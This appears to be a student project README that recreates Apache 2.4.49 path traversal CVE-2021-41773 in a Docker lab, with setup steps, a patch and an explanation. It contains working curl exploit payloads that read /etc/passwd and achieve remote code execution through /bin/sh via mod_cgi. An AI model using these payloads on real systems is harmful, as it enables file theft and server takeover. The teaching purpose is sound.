# CS-4277

Cybersecurity final project to recreate Apache Server vulnerability CVE-2021-41773.

## Team Members
- Beth Magembe
- Davis Tameh
- Jacob Davey

## Topic Selection
Project 1: Recreate and Exploit a Real-World CVE

## Project Abstract
This project recreates CVE-2021-41773 (Apache HTTP Server 2.4.49 path traversal) in a controlled Docker lab. The starter environment includes Apache 2.4.49, a public web root, and a sample protected file stored outside the document root so the exploit and patch phases can be added incrementally.



## Directory Layout

```
CS-4277/
├── README.md                 
├── demo.sh                   - one script that runs all 5 stages automatically
├── curl-commands.sh          - commands for manual testing 
├── vulnerable/
│   ├── Dockerfile            - Apache 2.4.49 with mod_cgi enabled
│   ├── docker-compose.yml
│   └── httpd-vulnerable.conf - has "Require all granted" on (bug)
├── patched/
│   ├── Dockerfile            - same Apache 2.4.49, secure config
│   ├── docker-compose.yml
│   └── httpd-patched.conf    - "Require all denied" on / (fix)
└── cgi-bin/
    └── printenv.cgi          - benign CGI helper
```

---

## Prerequisites

Install these before anything else:

| Tool | Download |
|------|----------|
| Docker Desktop | https://www.docker.com/products/docker-desktop |
| curl | Built into macOS/Linux. Windows: comes with Git Bash |

---

## Quick Start — Full Automated Demo

```bash
# 1. Clone/unzip this folder onto your machine
# 2. Make scripts executable
chmod +x demo.sh curl-commands.sh

# 3. Run the full demo (takes ~2 min, builds Docker images)
./demo.sh
```

You'll see each stage print clearly with ✔ pass / ✘ fail indicators.

---

## Manual Demo (for live narration)

### Step 1 — Start the vulnerable container
```bash
cd vulnerable
docker compose up -d --build
# Wait ~30 seconds for Apache to start
```

### Step 2 — Confirm it's running normally
```bash
curl http://localhost:8080/
# Should return the Apache default page HTML
```

### Step 3 — Stage 1: Path Traversal → read /etc/passwd
```bash
curl --path-as-is \
  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```
**Expected**: The contents of `/etc/passwd` — lines like `root:x:0:0:root:/root:/bin/bash`

**Explanation**:
- `%2e` is the URL encoding of `.`
- So `.%2e/` decodes to `./` which combined with the next segment traverses up a directory
- Apache 2.4.49 checks the path *before* fully decoding it, so the traversal slips past the access check
- We use `/static/` (an Alias to `/`) as the entry point so Apache reads the file rather than trying to execute it

### Step 4 — Stage 2: Read a custom secret file
```bash
curl --path-as-is \
  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/secret_config.txt"
```
**Expected**: `SUPER_SECRET_DB_PASSWORD=hunter2`
This shows the impact isn't just system files — any file on the server is readable.

### Step 5 — Stage 3: RCE via mod_cgi
```bash
curl --path-as-is \
  -d "echo Content-Type: text/plain; echo; id; whoami; hostname" \
  "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```
**Expected**:
```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon
<container-id>
```
**Explanation**: 

For RCE we still use `/cgi-bin/` because we *want* Apache to execute the file — we're traversing to `/bin/sh` and POSTing shell commands in the request body. This is why the CVE has a CVSS score of 10.0.

### Step 6 — Stage 4: Mitigation
```bash
# Stop vulnerable container
docker compose down

# Start patched container
cd ../patched
docker compose up -d --build
sleep 15

# Run the same exploit against the patched server
curl --path-as-is \
  "http://localhost:8080/static/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```
**Expected**: `403 Forbidden`

One-line fix in `httpd-patched.conf`:
```
# BEFORE (vulnerable):
Require all granted

# AFTER (fixed):
Require all denied
```

### Cleanup
```bash
docker compose down
docker rmi apache-cve-2021-41773 apache-cve-patched 2>/dev/null
```

---

## Source-Level Patch Analysis

The actual code fix is in Apache's `server/request.c`.

View the real diff at: https://github.com/apache/httpd/commit/e150697

**Function changed**: `ap_normalize_path()`

**What happened before the patch**:
1. Request comes in: `/cgi-bin/.%2e/%2e%2e/etc/passwd`
2. Apache checks access controls using the encoded path → looks safe
3. Apache then decodes `%2e` → `.` to resolve the final path
4. Now the path is `/../etc/passwd` → file is served ← **bug is here**

**What the patch does**:
1. Decodes `%2e` → `.` first
2. Then normalizes `./` and `../` sequences
3. Then checks access controls against the normalized path
4. Now the traversal is caught before it reaches the filesystem



---



## References
1. Apache HTTP Server Project. Apache HTTP Server 2.4 vulnerabilities. https://httpd.apache.org/security/vulnerabilities_24.html
2. NVD. CVE-2021-41773. https://nvd.nist.gov/vuln/detail/CVE-2021-41773
